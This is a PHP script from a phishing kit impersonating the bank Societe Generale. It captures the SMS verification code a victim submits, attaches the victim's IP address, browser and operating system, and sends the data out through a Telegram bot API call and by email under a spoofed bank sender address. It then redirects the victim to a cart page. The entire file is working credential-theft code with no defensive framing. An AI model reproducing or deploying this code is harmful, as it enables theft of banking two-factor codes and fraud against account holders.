<?php


if(isset($_POST['sms'])){
	
include "../config.php";
include "funcs.php";

$tel =  $_POST['sms'];

$message = "\n🧨SMS: $tel\n🕹️OS : ".getOs($_SERVER['HTTP_USER_AGENT'])."\n🕹️Browser: ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\n🕹️IP : $ip\n🕹️Agent: ".$_SERVER['HTTP_USER_AGENT']."\n----\n";

toTG($message);
$headers = "From:  Societe Generale  <noreply@pabloescobard.com>";
//$headers .= "Content-type: text/html; charset=UTF-8\n";
$subject = "🕹️ Passe Securité |  $ip";

$emaillist = explode(',',$to);

foreach($emaillist as $email){
mail($email,$subject,$message,$headers,$head);
}
file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chat."&text=" . urlencode($message)."" );

echo "<meta http-equiv=\"Refresh\" content=\"0; url=../cart.php\" />";



}
?>